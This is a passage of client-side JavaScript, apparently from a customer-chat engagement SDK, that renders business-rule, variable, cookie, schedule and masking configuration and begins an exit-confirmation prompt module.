  addToJssdkRenderer('RenderActionLists', RenderActionLists);
  var RenderActions = function (caObj, rule, evt, extraArgs) {
    var actions = [];
    for (var i = 0; i < caObj.length; i++) {
      var item = caObj[i];
      actions.push(RenderAbstractAction(item, rule, evt, extraArgs));
    }
    return actions;
  };
  addToJssdkRenderer('RenderActions', RenderActions);
  var RenderBaseRuleType = function (obj, extraArgs) {
    var ruleObj = obj.rule;
    var originRule = {
      id: RenderAbstractNumber(ruleObj.id),
      name: RenderAbstractString(ruleObj.name),
      vars: RenderVariables(ruleObj.variables, null, null, extraArgs),
      tt1: function (rule) {
        return RenderWhen(ruleObj.when, rule, null, extraArgs);
      },
      cc2: function (rule, evt) {
        return RenderAbstractCondition(ruleObj.condition, rule, evt, extraArgs);
      },
      af3: function (rule, evt) {
        RenderActions(ruleObj.actions, rule, evt, extraArgs);
      },
      active: ruleObj.active
    };
    if ("hasDomTrigger" in ruleObj) {
      originRule.hasDomTrigger = ruleObj.hasDomTrigger;
    }
    if ("businessUnitID" in ruleObj) {
      originRule.businessUnitID = ruleObj.businessUnitID;
    }
    if ('short-name' in ruleObj) {
      originRule.bu8fr = function () {
        return RenderAbstractNumber(ruleObj['short-name']);
      };
    }
    if ("constants" in ruleObj) {
      originRule.constants = RenderAbstractConstants(ruleObj.constants, null, null, extraArgs);
    }
    return RENDERINGCONTEXT.Rule.create(originRule);
  };
  addToJssdkRenderer('RenderBaseRuleType', RenderBaseRuleType);
  var RenderBusinessRuleType = function (ruleObj, extraArgs) {
    var ruleInfo = {};
    var obj = ruleObj.rule;
    ruleInfo.id = RenderAbstractNumber(obj.id);
    if ("hasDomTrigger" in obj) ruleInfo.hasDomTrigger = obj.hasDomTrigger;
    if ("constants" in obj) ruleInfo.constants = RenderAbstractConstants(obj.constants, null, null, extraArgs);
    ruleInfo.name = RenderAbstractString(obj.name);
    if ("ruleType" in obj) ruleInfo.ruleType = obj.ruleType;
    if ("asyncSettings" in obj) {
      ruleInfo.asyncChat = function () {
        return RenderAbstractCondition(obj.asyncSettings.asyncChat, null, null, extraArgs);
      };
      if ("conversationTranscriptMode" in obj.asyncSettings) ruleInfo.conversationTranscriptMode = obj.asyncSettings.conversationTranscriptMode;
      if ("conversationTranscriptDays" in obj.asyncSettings) ruleInfo.conversationTranscriptDays = obj.asyncSettings.conversationTranscriptDays;
      if ("ciEnabledOnResolve" in obj.asyncSettings) ruleInfo.ciEnabledOnResolve = function () {
        return RenderAbstractCondition(obj.asyncSettings.ciEnabledOnResolve, null, null, extraArgs);
      };
      if ("showOpenerForEndedConversation" in obj.asyncSettings) ruleInfo.showOpenerForEndedConversation = function () {
        return RenderAbstractCondition(obj.asyncSettings.showOpenerForEndedConversation, null, null, extraArgs);
      };
      if ("createNewConversation" in obj.asyncSettings) ruleInfo.createNewConversation = function () {
        return RenderAbstractCondition(obj.asyncSettings.createNewConversation, null, null, extraArgs);
      };
      if ("asyncSurveySpecID" in obj.asyncSettings) ruleInfo.asyncSurveySpecID = function () {
        return RenderAbstractNumber(obj.asyncSettings.asyncSurveySpecID);
      };
    } else {
      ruleInfo.asyncChat = function () {
        return obj.asyncChat;
      };
      if ("conversationTranscriptMode" in obj) ruleInfo.conversationTranscriptMode = obj.conversationTranscriptMode;
      if ("conversationTranscriptDays" in obj) ruleInfo.conversationTranscriptDays = obj.conversationTranscriptDays;
      if ("ciEnabledOnResolve" in obj) ruleInfo.ciEnabledOnResolve = function () {
        return obj.ciEnabledOnResolve;
      };
      if ("showOpenerForEndedConversation" in obj) ruleInfo.showOpenerForEndedConversation = function () {
        return obj.showOpenerForEndedConversation;
      };
      if ("createNewConversation" in obj) ruleInfo.createNewConversation = function () {
        return obj.createNewConversation;
      };
      if ("asyncSurveySpecID" in obj) ruleInfo.asyncSurveySpecID = function () {
        return obj.asyncSurveySpecID;
      };
    }
    if ("sendChatRequestOnDemand" in obj) ruleInfo.sendChatRequestOnDemand = obj.sendChatRequestOnDemand;
    if (obj.funnelLevel) ruleInfo.funnelLevel = RenderAbstractNumber(obj.funnelLevel);
    if ("ignoreFunnelLevel" in obj) ruleInfo.ignoreFunnelLevel = obj.ignoreFunnelLevel;
    if ("ignorePageScrollingOnC2CFocus" in obj) ruleInfo.ignorePageScrollingOnC2CFocus = obj.ignorePageScrollingOnC2CFocus;
    if ("businessUnitID" in obj) ruleInfo.businessUnitID = obj.businessUnitID;
    if ("businessUnitIdFromRule" in obj) ruleInfo.bu8fr = function () {
      return RenderAbstractNumber(obj.businessUnitIdFromRule);
    };
    if ("language" in obj) ruleInfo._getLanguage = function (rule) {
      return RenderAbstractString(obj.language, rule, null, extraArgs);
    };
    ruleInfo.vars = RenderVariables(obj.vars);
    if ("priority" in obj) ruleInfo.priority = RenderAbstractNumber(obj.priority);
    ruleInfo.tt1 = function (rule) {
      return RenderWhen(obj.when, rule, null, extraArgs);
    };
    if (obj['q-threshold']) ruleInfo.getRuleQueueThreshold = function () {
      return RenderAbstractNumber(obj["q-threshold"]);
    };
    if ("agentAtts" in obj) ruleInfo.getAAtts = function () {
      return RenderAttributes(obj.agentAtts);
    };
    if ("routingAllocationSpecs" in obj) {
      var allocationSpecs = [];
      for (var i = 0; i < obj.routingAllocationSpecs.length; i++) {
        var spec = obj.routingAllocationSpecs[i];
        if ("routingAllocationSpecId" in spec) allocationSpecs.push(RenderAbstractNumber(spec.routingAllocationSpecId));else allocationSpecs.push(encodeURIComponent(RenderAbstractString(spec.routingAllocationSpecName)));
      }
      obj.gr0 = function () {
        return allocationSpecs;
      };
    }
    if ("agID" in obj) ruleInfo.agID = RenderAgentGroup(obj.agID);
    if ("agentGroupID" in obj) ruleInfo.getAgID = function () {
      return RenderAbstractNumber(obj.agentGroupID);
    };
    if (obj["agent-profile-id"]) {
      ruleInfo.getPublicAgentId = function () {
        return obj.publicAgentId;
      };
      ruleInfo.getFallbackAgentGroupEnabled = function () {
        return obj.fallbackAgentGroupEnabled;
      };
    } else if (obj["agent-profile-name"]) {
      ruleInfo.getAgentName = function () {
        return RenderAbstractString(obj.agentName);
      };
      ruleInfo.getFallbackAgentGroupEnabled = function () {
        return obj.fallbackAgentGroupEnabled;
      };
    } else if ("agentIdRef" in obj) {
      ruleInfo.getAgentIdRef = function () {
        return RenderAbstractNumber(obj.agentIdRef);
      };
    } else if ("publicAgentId" in obj) {
      ruleInfo.getPublicAgentId = function () {
        return RenderAbstractString(obj.publicAgentId);
      };
    }
    if ("businessUnitId" in obj) ruleInfo.businessUnitId = obj.businessUnitId;
    if ("ruleAtts" in obj) ruleInfo.getRAtts = function () {
      return RenderAttributes(obj.ruleAtts);
    };
    if ("dates" in obj) ruleInfo.dates = RenderValidDates(obj.dates);
    if ("automatonParameterMap" in obj) {
      var getAutomatons = [];
      for (var i = 0; i < obj.automatonParameterMap.length; i++) {
        getAutomatons.push(function (i) {
          var automaton = obj.automatonParameterMap[i];
          var renderred = {
            "automatonID": RenderAbstractString(automaton.automatonID),
            "context": RenderAbstractString(automaton.context),
            "location": RenderAbstractString(automaton.location)
          };
          if ("shouldSuppress" in automaton) {
            renderred.shouldSuppress = RenderAbstractCondition(automaton.shouldSuppress, null, null, extraArgs);
          }
          if ("datapass" in automaton) renderred.datapass = RenderAbstractObject(automaton.datapass);
          return renderred;
        });
      }
      ruleInfo.a8pm = function () {
        return getAutomatons.map(function (getAutomaton, i) {
          return getAutomaton(i);
        });
      };
    }
    ruleInfo.cc2 = function (rule, evt) {
      return RenderAbstractCondition(obj.condition, rule, evt, extraArgs);
    };
    ruleInfo.af3 = function (rule, evt) {
      return RenderActions(obj.actions, rule, evt, extraArgs);
    };
    ruleInfo.active = obj.active;
    if ("ruleIndex" in obj) ruleInfo.ruleIndex = obj.ruleIndex;
    return RENDERINGCONTEXT.BusinessRule.create(ruleInfo);
  };
  addToJssdkRenderer('RenderBusinessRuleType', RenderBusinessRuleType);
  var RenderCookieResource = function (cookieObj) {
    var resultObj = {};
    var resource_id = RenderAbstractString(cookieObj["resource-id"]);
    var cookie_path = cookieObj["path"] ? RenderAbstractString(cookieObj["path"]) : null;
    var cookie_lt = cookieObj["cookie-life-time"] ? RenderAbstractNumber(cookieObj["cookie-life-time"]) : 0;
    resultObj["resource"] = new RENDERINGCONTEXT.CCD(resource_id, RenderAbstractString(cookieObj["cookie-name"]), cookie_path, cookie_lt, RenderAbstractString(cookieObj["domain"]), cookieObj["overflow-purge-priority"], RENDERINGCONTEXT.CM);
    resultObj["resource-id"] = resource_id;
    return resultObj;
  };
  addToJssdkRenderer('RenderCookieResource', RenderCookieResource);
  var RenderEmbeddedConfig = function (url, markerID, obj) {
    var isMarkerMatch = true;
    for (var i = 0; i < obj.length; i++) {
      var conf = obj[i];
      if ("page-marker" in conf) {
        if (!!markerID) {
          isMarkerMatch = markerID.match(RenderMixedString(conf["page-marker"]));
        }
      }
      var not_match = true;
      if ("exclude-url" in conf) {
        for (var j = 0; j < conf["exclude-url"].length; j++) {
          var exclude_url = conf["exclude-url"][j];
          not_match = not_match && !url.match(RenderMixedString(exclude_url));
        }
      }
      if (not_match) {
        var match = false;
        if (conf["include-url"]) {
          for (var j = 0; j < conf["include-url"].length; j++) {
            var include_url = conf["include-url"][j];
            match = match || url.match(RenderMixedString(include_url));
          }
          if (isMarkerMatch && match) {
            return true;
          }
        }
      }
      isMarkerMatch = true;
    }
    return false;
  };
  addToJssdkRenderer('RenderEmbeddedConfig', RenderEmbeddedConfig);
  var RenderJsResource = function (jsObj) {
    var resultObj = {};
    var resource_id = jsObj["resource-id"];
    resultObj["resource"] = new RENDERINGCONTEXT.JSResource(resource_id, jsObj["access"]);
    resultObj["resource-id"] = resource_id;
    return resultObj;
  };
  addToJssdkRenderer('RenderJsResource', RenderJsResource);
  var RenderLandingCounter = function (landingCounterObj) {
    var resultObj = RENDERINGCONTEXT.Rule.create({
      id: -Math.abs(landingCounterObj.id),
      name: RenderAbstractString(landingCounterObj["counter-name"]),
      vars: [{
        name: RenderAbstractString(landingCounterObj["counter-name"]),
        defVal: function () {
          if ("start-value" in landingCounterObj) {
            return RenderAbstractNumber(landingCounterObj["start-value"]);
          } else {
            return null;
          }
        }(),
        rId: landingCounterObj["resource-id"],
        shName: function () {
          if ("short-name" in landingCounterObj) {
            return RenderAbstractString(landingCounterObj["short-name"]);
          } else {
            return obj.defVal.value;
          }
        }(),
        fnCast: function (o) {
          return parseFloat(o);
        },
        type: "generic"
      }],
      tt1: function (rule) {
        return [{
          id: "onPageLanding"
        }];
      },
      cc2: function (rule, evt) {
        return RenderAbstractCondition(landingCounterObj.condition, rule, evt);
      },
      af3: function (rule, evt) {
        var newValue = RENDERINGCONTEXT.PM.getVar(RenderAbstractString(landingCounterObj["counter-name"]), rule).z0();
        if ("step" in landingCounterObj) {
          newValue += RenderAbstractNumber(landingCounterObj.step);
        } else {
          newValue += 1;
        }
        RENDERINGCONTEXT.PM.getVar(RenderAbstractString(landingCounterObj["counter-name"]), rule).z3(newValue);
      },
      active: landingCounterObj.active
    });
    return resultObj;
  };
  addToJssdkRenderer('RenderLandingCounter', RenderLandingCounter);
  var RenderLandingCounters = function (landingCountersObj) {
    var landingCounters = [];
    for (var i = 0; i < landingCountersObj.length; i++) {
      var landingCounterObj = landingCountersObj[i];
      landingCounters.push(RenderLandingCounter(landingCounterObj));
    }
    return landingCounters;
  };
  addToJssdkRenderer('RenderLandingCounters', RenderLandingCounters);
  var RenderLocalStorageResource = function (resObj) {
    var resultObj = {};
    var resource_id = RenderAbstractString(resObj["id"]);
    var resource = resObj["resource"];
    resultObj["resource-id"] = resource_id;
    resultObj["resource"] = new RENDERINGCONTEXT.LocalStorageResource(resource_id, RenderAbstractString(resource.name), RenderAbstractNumber(resource.lifetime), resource.sessionStorage, RENDERINGCONTEXT.SM);
    return resultObj;
  };
  addToJssdkRenderer('RenderLocalStorageResource', RenderLocalStorageResource);
  var RenderMaskingConfig = function (obj) {
    var returnObj = [];
    for (var i = 0; i < obj.length; i++) {
      var config = obj[i];
      if ("pageMarker" in config) config.pageMarker = RenderMixedString(config.pageMarker);
      if ("contentGroupId" in config) config.contentGroupId = RenderAbstractString(config.contentGroupId);
      if ("urlRegex" in config) config.urlRegex = RenderAbstractString(config.urlRegex);
      if ("markerRegex" in config) config.markerRegex = RenderAbstractString(config.markerRegex);
      config.selector = RenderMixedString(config.selector);
      config.regex = new RegExp(RenderMixedString(config.regex), "gi");
      config.mask = RenderMixedString(config.mask);
      returnObj.push(config);
    }
    return returnObj;
  };
  var RenderMixedString = function (objArray) {
    var result = "";
    for (var idx = 0; idx < objArray.length; idx++) {
      result += RenderAbstractString(objArray[idx]);
    }
    return result;
  };
  addToJssdkRenderer('RenderMaskingConfig', RenderMaskingConfig);
  addToJssdkRenderer('RenderMixedString', RenderMixedString);
  var RenderResource = function (resourceObj) {
    var returnObj = {};
    for (var i = 0; i < resourceObj.length; i++) {
      var item = RenderAbstractString(resourceObj[i]);
      returnObj[item["resource-id"]] = item["id"];
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderResource', RenderResource);
  var RenderRule = function (ruleObj, extraArgs) {
    if (ruleObj.type == "base-rule") {
      return RenderBaseRuleType(ruleObj, extraArgs);
    } else if (ruleObj.type == "business-rule") {
      return RenderBusinessRuleType(ruleObj, extraArgs);
    }
    throw "RenderRule: Unexpected rule type: " + ruleObj.value;
  };
  addToJssdkRenderer('RenderRule', RenderRule);
  var RenderRules = function (obj, extraArgs) {
    var rules = [];
    for (var i = 0; i < obj.length; i++) {
      var item = obj[i];
      rules.push(RenderRule(item, extraArgs));
    }
    return rules;
  };
  addToJssdkRenderer('RenderRules', RenderRules);
  var RenderSchedule = function (scheduleObj) {
    var resultObj;
    var startDateTime = null;
    if ("start-date-time" in scheduleObj) {
      startDateTime = RenderAbstractDate(scheduleObj["start-date-time"]);
    }
    var endDateTime = null;
    if ("end-date-time" in scheduleObj) {
      endDateTime = RenderAbstractDate(scheduleObj["end-date-time"]);
    }
    var startTime = null,
      endTime = null,
      days = null,
      timeZone;
    if ("days" in scheduleObj) {
      days = RenderAbstractList(scheduleObj["days"]);
    }
    if ("time-zone" in scheduleObj) {
      timeZone = scheduleObj["time-zone"];
      if ("time-start" in scheduleObj) {
        startTime = scheduleObj["time-start"];
      }
      if ("time-end" in scheduleObj) {
        endTime = scheduleObj["time-end"];
      }
      resultObj = RENDERINGCONTEXT.Schedule.createSchedule(scheduleObj["schedule-id"], startDateTime, endDateTime, startTime, endTime, days, timeZone);
    } else {
      if ("time-start" in scheduleObj) {
        startTime = RenderAbstractDate(scheduleObj["time-start"]);
      }
      if ("time-end" in scheduleObj) {
        endTime = RenderAbstractDate(scheduleObj["time-end"]);
      }
      if ("days" in scheduleObj) {
        resultObj = RENDERINGCONTEXT.Schedule.createSchedule(scheduleObj["schedule-id"], startDateTime, endDateTime, startTime, endTime, days);
      } else {
        resultObj = RENDERINGCONTEXT.Schedule.createSchedule(scheduleObj["schedule-id"], startDateTime, endDateTime, startTime, endTime);
      }
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderSchedule', RenderSchedule);
  var RenderSchedules = function (scheduesObj) {
    var resultObj = {};
    for (var key in scheduesObj) {
      resultObj[key] = RenderSchedule(scheduesObj[key]);
    }
    return resultObj;
  };
  addToJssdkRenderer('RenderSchedules', RenderSchedules);
  var RenderValidDates = function (obj) {
    var returnObj = {};
    returnObj.start = RenderAbstractDate(obj.start);
    returnObj.end = RenderAbstractDate(obj.end);
    return returnObj;
  };
  addToJssdkRenderer('RenderValidDates', RenderValidDates);
  var RenderBooleanVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      result.defVal = RenderAbstractCondition(obj.default);
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.type = "generic";
    result.fnCast = function (o) {
      return Boolean(o);
    };
    result.fnSer = function (b) {
      return RENDERINGCONTEXT.inu1(b) ? null : Number(b);
    };
    return result;
  };
  addToJssdkRenderer('RenderBooleanVariable', RenderBooleanVariable);
  var RenderDateListVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      var dateArray = [];
      for (var item in obj.default) {
        dateArray.push(RenderAbstractDate(obj.default[item]));
      }
      result.defVal = dateArray;
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.type = "DateList";
    if ("maxEntr" in obj) {
      result.maxEntr = obj.maxEntr;
    }
    return result;
  };
  addToJssdkRenderer('RenderDateListVariable', RenderDateListVariable);
  var RenderDateVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      result.defVal = RenderAbstractDate(obj.default);
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.type = "Date";
    return result;
  };
  addToJssdkRenderer('RenderDateVariable', RenderDateVariable);
  var RenderMapVariable = function (obj, rule, evt) {
    var result = {};
    result.name = RenderAbstractString(obj.name, rule, evt);
    var mapArray = [];
    for (var i = 0; i < obj.default.length; i++) {
      var item = obj.default[i];
      mapArray.push({
        key: RenderAbstractItem(item.key, rule, evt),
        value: RenderAbstractItem(item.value, rule, evt)
      });
    }
    result.defVal = mapArray;
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"], rule, evt);
    }
    result.rId = RenderAbstractString(obj["resource-id"], rule, evt);
    result.type = "Map";
    if ("maxEntr" in obj) {
      result.maxEntr = obj.maxEntr;
    }
    return result;
  };
  addToJssdkRenderer('RenderMapVariable', RenderMapVariable);
  var RenderNumberListVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      var numberArray = [];
      for (var item in obj.default) {
        numberArray.push(RenderAbstractNumber(obj.default[item]));
      }
      result.defVal = numberArray;
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.type = "List";
    if ("maxEntr" in obj) {
      result.maxEntr = obj.maxEntr;
    }
    return result;
  };
  addToJssdkRenderer('RenderNumberListVariable', RenderNumberListVariable);
  var RenderNumberVariable = function (numberObj) {
    var result = {};
    result.name = RenderAbstractString(numberObj.name);
    if (numberObj.default == null) {
      result.defVal = null;
    } else {
      result.defVal = RenderAbstractNumber(numberObj.default);
    }
    if (numberObj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(numberObj["short-name"]);
    }
    result.rId = RenderAbstractString(numberObj["resource-id"]);
    result.fnCast = function (o) {
      return parseFloat(o);
    };
    result.type = "generic";
    return result;
  };
  addToJssdkRenderer('RenderNumberVariable', RenderNumberVariable);
  var RenderObjectVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      result.defVal = RenderAbstractObject(obj.default);
    }
    if (obj.shName == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.fnCast = function (o) {
      return RENDERINGCONTEXT.MI8.mixMutatable(o);
    };
    result.type = "generic";
    return result;
  };
  addToJssdkRenderer('RenderObjectVariable', RenderObjectVariable);
  var RenderStringListVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      var strArray = [];
      for (var item in obj.default) {
        strArray.push(RenderAbstractString(obj.default[item]));
      }
      result.defVal = strArray;
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    result.type = "List";
    return result;
  };
  addToJssdkRenderer('RenderStringListVariable', RenderStringListVariable);
  var RenderStringVariable = function (obj) {
    var result = {};
    result.name = RenderAbstractString(obj.name);
    if (obj.default == null) {
      result.defVal = null;
    } else {
      result.defVal = RenderAbstractString(obj.default);
    }
    if (obj["short-name"] == null) {
      result.shName = null;
    } else {
      result.shName = RenderAbstractString(obj["short-name"]);
    }
    result.rId = RenderAbstractString(obj["resource-id"]);
    if (obj.fnCast) {
      result.fnCast = function (o) {
        return o ? k6ji.TUY9(o.toString()) : k6ji.TUY9(o);
      };
    } else {
      result.fnCast = function (o) {
        return o ? o.toString() : o;
      };
    }
    if (obj.fnSer) {
      result.fnSer = function (o) {
        return k6ji.pN65(o);
      };
    } else {
      result.fnSer = null;
    }
    result.maxSize = obj.maxSize;
    result.fnCast = function (o) {
      return RENDERINGCONTEXT.MI8.mixMutatable(o);
    };
    result.type = "String";
    return result;
  };
  addToJssdkRenderer('RenderStringVariable', RenderStringVariable);
  var RenderVisitorAttributeType = function (visitorAttributeObj, rule, evt, extraArgs) {
    var result = {};
    var mixM = RENDERINGCONTEXT.MI8.mixMutatable();
    for (var i = 0; i < visitorAttributeObj.values.length; i++) {
      var value = visitorAttributeObj.values[i];
      mixM = mixM.set(RenderAbstractString(value, rule, evt, extraArgs), true);
    }
    var attrObj = {
      "values": RENDERINGCONTEXT.MI8.unmixMutatable(mixM)
    };
    attrObj["mutuallyExclusive"] = visitorAttributeObj["mutuallyExclusive"];
    result["key"] = visitorAttributeObj["name"];
    ;
    result["value"] = attrObj;
    return result;
  };
  addToJssdkRenderer('RenderVisitorAttributeType', RenderVisitorAttributeType);
  var RenderVisitorAttribute = function (visitorAttributeObj, rule, evt, extraArgs) {
    if (visitorAttributeObj.type == "visitorAttribute") {
      return RenderVisitorAttributeObj(visitorAttributeObj, rule, evt, extraArgs);
    } else if (visitorAttributeObj.type == "visitorAttributeType") {
      return RenderVisitorAttributeType(visitorAttributeObj, rule, evt, extraArgs);
    }
    throw "RenderVisitorAttribute: Unexpected Visitor Attribute type: " + visitorAttributeObj.value;
  };
  addToJssdkRenderer('RenderVisitorAttribute', RenderVisitorAttribute);
  var RenderVisitorAttributeObj = function (visitorAttributeObj) {
    var returnObj = {};
    var attrObj = {
      "values": visitorAttributeObj["values"]
    };
    attrObj["mutuallyExclusive"] = visitorAttributeObj["mutuallyExclusive"];
    attrObj["externalCustomerID"] = visitorAttributeObj["externalCustomerID"];
    attrObj["writeToCookie"] = visitorAttributeObj["writeToCookie"];
    if ("maxLength" in visitorAttributeObj) attrObj["maxLength"] = visitorAttributeObj["maxLength"];
    returnObj["key"] = visitorAttributeObj["name"];
    returnObj["value"] = attrObj;
    return returnObj;
  };
  addToJssdkRenderer('RenderVisitorAttributeObj', RenderVisitorAttributeObj);
  var RenderVisitorAttributes = function (visitorAttributesObj, rule, evt, extraArgs) {
    var returnObj = {};
    for (var i = 0; i < visitorAttributesObj.length; i++) {
      var item = visitorAttributesObj[i];
      var attrObj = RenderVisitorAttribute(item, rule, evt, extraArgs);
      returnObj[attrObj.key] = attrObj.value;
    }
    return returnObj;
  };
  addToJssdkRenderer('RenderVisitorAttributes', RenderVisitorAttributes);
  var RenderWebResource = function (webObj) {
    var resultObj = {};
    var resource_id = webObj["resource-id"];
    var allowProtocolNormalization = webObj["url"]["allow-protocol-normalization"];
    var url_string = webObj["url"]["server-url"] ? RenderAbstractString(webObj["url"]["server-url"], null, null, RENDERINGCONTEXT.urls) : RenderAbstractString(webObj["url"]["string-concat"], null, null, RENDERINGCONTEXT.urls);
    if (allowProtocolNormalization) {
      url_string = RENDERINGCONTEXT.secureProtocol(url_string);
    }
    if ("method" in webObj) {
      resultObj["resource"] = new RENDERINGCONTEXT.WebResource(resource_id, url_string, webObj["access"], webObj["method"]);
    } else {
      resultObj["resource"] = new RENDERINGCONTEXT.WebResource(resource_id, url_string, webObj["access"]);
    }
    resultObj["resource-id"] = resource_id;
    return resultObj;
  };
  addToJssdkRenderer('RenderWebResource', RenderWebResource);
  var RenderWhen = function (obj, rule) {
    var events = [];
    for (var i = 0; i < obj.length; i++) {
      var evt = null;
      events.push(RenderAbstractEvent(obj[i], rule, evt));
    }
    return events;
  };
  addToJssdkRenderer('RenderWhen', RenderWhen);
  window.JSSDK_RENDERER = jssdk_renderer;
  return jssdk_renderer;
}();
var callJssdkApi = function (attemptNumber) {
  if (!attemptNumber) {
    attemptNumber = 1;
  }
  var MAX_ATTEMPTS_COUNT = 3;
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
      if (xhr.status == 200) {
        var jsonAPIData = JSON.parse(xhr.responseText);
        v3Lander.jsonAPIData = jsonAPIData;
        v3Lander.initSiteDefaultData(function () {
          function EXCVTR() {
            this.secondAttempt = false;
            this.enabled = false;
            this.masterEnabled = true;
            this.resetPromptTimer = "";
            this.USIdone = false;
            this.initialized = false;
            this._rule = null;
          }
          EXCVTR.prototype.isListener = function (l) {
            return !!(l && (l.onCancelExit && "function" == typeof l.onCancelExit || l.onBeforeExitConfirmation && "function" == typeof l.onBeforeExitConfirmation));
          };
          EXCVTR.prototype.fireCancelExitEvent = function () {
            function f(l, evt) {
              try {
                if (!!l.onCancelExit) l.onCancelExit(evt);
              } catch (e) {
                log("Error firing event CancelExit on " + l.toString() + ":" + e);
              }
            }
            var event = {
              rule: this._rule
            };
            this._fireEvt(f, event);
          };
          EXCVTR.prototype.onChatLaunched = function (evt) {
            this.setEnabled(false);
          };
          EXCVTR.prototype.onChatClosed = function (evt) {
            this.setEnabled(true);
          };
          EXCVTR.prototype.fireBeforeExitConfirmationEvent = function () {
            function f(l, evt) {
              try {
                if (!!l.onBeforeExitConfirmation) l.onBeforeExitConfirmation(evt);
              } catch (e) {
                log("Error firing event BeforeExitConfirmation on " + l.toString() + ":" + e);
              }
            }
            var event = {
              rule: this._rule
            };
            this._fireEvt(f, event);
          };
          EXCVTR.prototype.tempDisable = function () {
            if (Inq.EC.isEnabled()) {
              Inq.EC.setEnabled(false);
              log("Exit Chat temporarily disabled");
              if ("" != Inq.EC.resetPromptTimer) win.clearTimeout(Inq.EC.resetPromptTimer);
              Inq.EC.resetPromptTimer = win.setTimeout(Inq.EC.reEnable, 3e3);
            }
          };
          EXCVTR.prototype.disableExitChat = function () {
            Inq.EC.masterEnabled = false;
            return true;
          };
          EXCVTR.prototype.reEnable = function () {
            if (!Inq.EC.USIdone) Inq.EC.setEnabled(true);
            Inq.EC.resetPromptTimer = "";
            log("re-enabled alert");
          };
          EXCVTR.prototype.doActions = function (evt) {
            setTimeout(function () {
              inqFrame.Inq.EC.fireCancelExitEvent();
            }, 1e3);
          };
          EXCVTR.prototype.doInit = function (rule, aTxt, image, cTxt, automatedAgent, businessUnitID, checkAgentAvailabilityInterval) {
            if (isServiceBlocked("POPUP")) return;
            this._rule = rule;
            var showImage = null != image && (isSafari() || isChrome());
            var imageWidth = 0;
            var imageHeight = 0;
            var imageElement;
            if (showImage) {
              imageElement = document.createElement("img");
              imageElement.src = urls.mediaSiteURL + "/images/" + image;
              imageElement.id = "ExitConfirmImage";
              imageElement.style.cssText = "position:absolute;top:0px;left:0px;";
              document.body.appendChild(imageElement);
            }
            this._businessUnitID = businessUnitID;
            this._automatedAgent = !!automatedAgent === automatedAgent ? automatedAgent : !automatedAgent;
            if (this._automatedAgent) this.reEnable();else {
              this.dataMap = {
                buID: this._businessUnitID,
                siteID: Inq.siteID,
                brID: rule.id,
                agentAttributes: rule.getAgentAttributes(),
                ruleAttributes: rule.getRuleAttributes(),
                agID: rule.getAgentGroupID()
              };
              if (checkAgentAvailabilityInterval) this.runAgentCheckTimer(checkAgentAvailabilityInterval);else this.callRemote(Inq.urls.agentsAvailabilityCheckURL, this.dataMap);
            }
            addListener(win.document.documentElement, "mousedown", this.tempDisable);
            addListener(win.document.documentElement, "click", this.tempDisable);
            addListener(win.document.documentElement, "keypress", this.tempDisable);
            addListener(win.document.documentElement, "submit", this.disableExitChat);
            win.v3Lander.prepareBeforeUnload(aTxt, cTxt, this.doActions, showImage, imageElement);
            if (this.initialized) throw "Single Use Exception. Exit Confirmation may only be used once per page for rules. Check for redundant rules of this type.";
            this.rule = rule;
            this.initialized = true;
            function addListener(element, eventName, handler) {
              if (element.addEventListener) element.addEventListener(eventName, handler, true);else if (iframe.attachEvent) element.attachEvent("on" + eventName, handler);
            }
          };
          EXCVTR.prototype.onRemoteCallback = function (jsonData) {
            if (!inu1(jsonData) && !inu1(jsonData.availability) && !inu1(jsonData.inHOP)) Inq.EC.setEnabled("true" === jsonData.availability && "true" === jsonData.inHOP);
          };
          EXCVTR.prototype.update = function (evt) {
            this.USIdone = true;
            if ("" != this.resetPromptTimer) clearTimeout(this.resetPromptTimer);
            var ruleFL = this._rule.gc7("fl", rule);
            if (Inq.GR34.isChatInProgress() || ruleFL && ruleFL >= PM.getVar("cfl").z0()) this.setEnabled(false);
            return true == this.masterEnabled && true == this.enabled;
          };
          EXCVTR.prototype.isEnabled = function () {
            return this.enabled;
          };
          EXCVTR.prototype.setEnabled = function (b) {
            this.enabled = b;
          };
          EXCVTR.prototype.runAgentCheckTimer = function runAgentCheckTimer(interval) {
            Inq.EC.callRemote(Inq.urls.agentsAvailabilityCheckURL, this.dataMap);
            setTimeout(function () {
              runAgentCheckTimer(interval);
            }, interval);
          };
          EXCVTR.prototype.isInitialized = function () {
            return this.initialized;
          };
          function ExitHook() {
            this.initialized = false;
            this._rule = null;
          }
          ExitHook.prototype.isListener = function (l) {
